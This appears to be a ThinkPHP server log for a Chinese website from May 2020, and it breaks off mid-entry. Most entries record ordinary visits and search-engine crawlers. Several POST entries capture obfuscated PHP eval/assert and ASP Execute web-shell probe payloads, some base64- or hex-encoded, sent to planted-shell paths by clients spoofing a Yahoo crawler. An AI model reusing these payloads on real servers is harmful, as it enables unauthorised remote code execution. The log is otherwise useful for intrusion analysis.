+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002009s ]
+[ info ] [ RUN ] app\index\controller\User->register[ /www/wwwroot/fw366.cn/application/index/controller/User.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/user/register.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+  3 => 'captchaType',
+  4 => 'url',
+  5 => 'title',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T18:17:03+08:00 ] 210.82.145.207 POST www.fw366.cn//api/map/google/inc.phpcc=244578703d73747272657628245f504f53545b277877275d293b6576616c282445787028245f504f53545b7a305d29293b
+[运行时间：0.040831s] [吞吐率：24.49req/s] [内存消耗：2,473.78kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002994s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003020s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'map',
+    2 => 'google',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.fw366.cn',
+  'content-length' => '297',
+  'x-forwarded-for' => '210.82.145.207',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '210.82.145.207',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'xw' => 'array_map("ass"."ert",array("ev"."Al(\\"\\\\\\$xx=\\\\\\"Ba"."SE6"."4_dEc"."OdE\\\\\\";@ev"."al(\\\\\\$xx(\'NjE0MzM2O0Bpbmlfc2V0KCJkaXNwbGF5X2Vycm9ycyIsIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7QHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTtlY2hvKCJAKmx4bCpAIik7O2VjaG8oIkxYTCIpO2VjaG8oIipAbHhsQCoiKTtkaWUoKTs=\'));\\");"));',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001902s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T18:17:03+08:00 ] 124.200.13.162 POST www.fw366.cn//api/map/google/inc.phpcc=244578703d73747272657628245f504f53545b277877275d293b6576616c282445787028245f504f53545b7a305d29293b
+[运行时间：0.041877s] [吞吐率：23.88req/s] [内存消耗：2,473.72kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000026s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003151s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003178s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'map',
+    2 => 'google',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.fw366.cn',
+  'content-length' => '398',
+  'x-forwarded-for' => '124.200.13.162',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '124.200.13.162',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'xw' => '@eval(get_magic_quotes_gpc()?stripslashes($_POST[chr(122).chr(48)]):$_POST[chr(122).chr(48)]);',
+  'z0' => '382614;@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("@*lxl*@");;echo("LXL");echo("*@lxl@*");die();',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002019s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T19:05:29+08:00 ] 121.37.12.142 GET www.fw366.cn/
+[运行时间：0.048000s] [吞吐率：20.83req/s] [内存消耗：2,931.78kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003151s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003178s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'www.fw366.cn',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-language' => 'zh-cn,en-us;q=0.5',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002026s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T19:05:29+08:00 ] 121.37.12.142 GET fw366.cn/
+[运行时间：0.044918s] [吞吐率：22.26req/s] [内存消耗：2,931.78kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000025s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003180s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003207s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'fw366.cn',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-language' => 'zh-cn,en-us;q=0.5',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001864s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T20:13:13+08:00 ] 122.13.163.190 GET fw366.cn/
+[运行时间：0.046871s] [吞吐率：21.34req/s] [内存消耗：2,930.86kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003133s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003160s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36',
+  'host' => 'fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001963s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T20:13:14+08:00 ] 122.13.163.190 GET fw366.cn/
+[运行时间：0.037208s] [吞吐率：26.88req/s] [内存消耗：2,930.86kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000020s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002521s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002544s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36',
+  'host' => 'fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001604s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T20:13:14+08:00 ] 122.13.163.190 GET fw366.cn/
+[运行时间：0.047270s] [吞吐率：21.16req/s] [内存消耗：2,930.86kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003133s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003161s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36',
+  'host' => 'fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002003s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T20:21:10+08:00 ] 60.12.239.246 POST fw366.cn//api/map/google/inc.phpcc=244578703d73747272657628245f504f53545b277877275d293b6576616c282445787028245f504f53545b7a305d29293b
+[运行时间：0.042716s] [吞吐率：23.41req/s] [内存消耗：2,473.78kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003143s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003170s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'map',
+    2 => 'google',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'content-length' => '297',
+  'x-forwarded-for' => '60.12.239.246',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '60.12.239.246',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'xw' => 'array_map("ass"."ert",array("ev"."Al(\\"\\\\\\$xx=\\\\\\"Ba"."SE6"."4_dEc"."OdE\\\\\\";@ev"."al(\\\\\\$xx(\'NjMyNzgwO0Bpbmlfc2V0KCJkaXNwbGF5X2Vycm9ycyIsIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7QHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTtlY2hvKCJAKmx4bCpAIik7O2VjaG8oIkxYTCIpO2VjaG8oIipAbHhsQCoiKTtkaWUoKTs=\'));\\");"));',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002009s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T20:21:10+08:00 ] 61.186.172.71 POST fw366.cn//api/map/google/inc.phpcc=244578703d73747272657628245f504f53545b277877275d293b6576616c282445787028245f504f53545b7a305d29293b
+[运行时间：0.043124s] [吞吐率：23.19req/s] [内存消耗：2,473.72kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003178s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003206s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'map',
+    2 => 'google',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'content-length' => '398',
+  'x-forwarded-for' => '61.186.172.71',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '61.186.172.71',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'xw' => '@eval(get_magic_quotes_gpc()?stripslashes($_POST[chr(122).chr(48)]):$_POST[chr(122).chr(48)]);',
+  'z0' => '453157;@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("@*lxl*@");;echo("LXL");echo("*@lxl@*");die();',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002039s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T20:33:30+08:00 ] 203.208.60.104 GET www.fw366.cn/
+[运行时间：0.048334s] [吞吐率：20.69req/s] [内存消耗：2,934.20kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003166s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003194s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'amp-cache-transform' => 'google;v="1..3"',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002031s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T21:00:38+08:00 ] 40.77.167.172 GET www.fw366.cn/
+[运行时间：0.048424s] [吞吐率：20.65req/s] [内存消耗：2,933.30kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003203s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003231s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+  'host' => 'www.fw366.cn',
+  'from' => 'bingbot(at)microsoft.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'pragma' => 'no-cache',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002072s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T21:59:28+08:00 ] 220.181.108.105 GET www.fw366.cn/
+[运行时间：0.047998s] [吞吐率：20.83req/s] [内存消耗：2,931.70kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003199s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003226s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+  'accept-language' => 'zh-cn,zh-tw',
+  'user-agent' => 'Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,like Gecko) Version/5.1 Mobile Safari/10600.6.3 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
+  'connection' => 'close',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002017s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T23:08:16+08:00 ] 61.155.157.2 GET www.fw366.cn/
+[运行时间：0.048263s] [吞吐率：20.72req/s] [内存消耗：2,931.43kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000030s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003289s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003317s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002147s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T23:09:24+08:00 ] 58.207.72.197 POST www.fw366.cn//api/oauth/qq/a.asp
+[运行时间：0.040612s] [吞吐率：24.62req/s] [内存消耗：2,474.49kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000026s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002943s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002969s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'oauth',
+    2 => 'qq',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.fw366.cn',
+  'content-length' => '816',
+  'x-forwarded-for' => '58.207.72.197',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '58.207.72.197',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M"&"i"&"d(s,i,2):If IsNumeric(M"&"i"&"d(s,i,1)) Then:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&"""")""""):Else:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&M"&"i"&"d(s,i+2,2)&"""")""""):i=i+2:End If""&c"&"h"&"r(10)&""Next:End Function:Response.Write(""""@*lxl*@""""):Ex"&"e"&"cute(""""On Error Resume Next:""""&bd(""""526573706F6E73652E577269746528224C584C2229"""")):Response.Write(""""*@lxl@*""""):Response.End"")")',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001885s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T23:09:24+08:00 ] 210.12.66.34 POST www.fw366.cn//api/oauth/qq/a.asp
+[运行时间：0.042425s] [吞吐率：23.57req/s] [内存消耗：2,474.37kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000026s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003140s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003168s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'oauth',
+    2 => 'qq',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.fw366.cn',
+  'content-length' => '681',
+  'x-forwarded-for' => '210.12.66.34',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '210.12.66.34',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
